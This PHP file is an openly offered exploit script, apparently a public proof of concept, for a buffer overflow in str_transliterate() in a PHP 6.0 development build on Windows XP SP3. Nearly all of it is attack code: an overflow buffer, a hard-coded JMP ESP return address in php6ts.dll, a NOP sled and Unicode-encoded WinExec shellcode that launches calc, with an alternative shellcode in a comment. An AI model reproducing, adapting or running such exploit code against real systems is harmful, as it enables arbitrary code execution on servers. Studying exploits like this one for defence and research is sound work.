<?php
error_reporting(0);
#####################################################################
## PHP 6.0 Dev str_transliterate() 0Day Buffer Overflow Exploit
## Tested on WIN XP HEB SP3, Apache, PHP 6.0 Dev
## Buffer Overflow
## Bug discovered by Pr0T3cT10n, <pr0t3ct10n@gmail.com>
## Exploited by TheLeader, Debug
## SP. Thanks: HDM
## http://www.nullbyte.org.il
#####################################################################
## This code should exploits a buffer overflow in the str_transliterate() function to call WinExec and execute CALC
## Take a look, 'unicode.semantics' has to be on!
## php.ini > unicode.semantics = on
#####################################################################
if(ini_get_bool('unicode.semantics')) {
 $buff = str_repeat("\u4141", 256);
 $eip = "\u1445\u10A9"; # 0x10A91445 JMP ESP @ php6ts.dll
 $nops = str_repeat("\u9090", 20);

 # WinExec Calc XP SP3 HEB Unicode-encoded shellcode
 $shellcode = "\u02EB\u05EB\uF9E8\uFFFF\u33FF\u5BC0\u4388\u8315\u11C3\uBB53\u250D\u7C86\uD3FF\u6163\u636C\u414E";
 
 # WinExec Calc XP SP3 EN Unicode-encoded shellcode (added by muts)
 # $shellcode = "\u02EB\u05EB\uF9E8\uFFFF\u33FF\u5BC0\u4388\u8315\u11C3\uBB53\u23AD\u7C86\uD3FF\u6163\u636C\u414E";
 
 $exploit = $buff.$eip.$nops.$shellcode;
 str_transliterate(0, $exploit, 0);
} else {
 exit("Error! 'unicode.semantics' has be on!\r\n");
}

function ini_get_bool($a) {
 $b = ini_get($a);
 switch (strtolower($b)) {
  case 'on':
  case 'yes':
  case 'true':
   return 'assert.active' !== $a;
  case 'stdout':
  case 'stderr':
   return 'display_errors' === $a;
  default:
   return (bool) (int) $b;
 }
}
?>